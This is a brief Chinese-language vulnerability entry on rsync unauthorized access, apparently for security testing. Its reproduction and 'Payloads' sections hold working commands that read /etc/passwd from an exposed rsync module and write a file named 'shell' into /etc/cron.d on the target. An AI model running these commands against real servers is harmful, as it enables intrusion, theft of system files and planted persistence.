# Rsync 未授权访问漏洞

## 漏洞描述
Rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
访问建立后，可以查看模块名列表，有一个src模块，我们再列出这个模块下的文件：

```
rsync rsync://your-ip:873/src/
```

这是一个Linux根目录，我们可以下载任意文件：

```
rsync -av rsync://your-ip:873/src/etc/passwd ./

## Payloads
```
rsync rsync://your-ip:873/src/
```
```
rsync -av rsync://your-ip:873/src/etc/passwd ./
```
```
rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
```
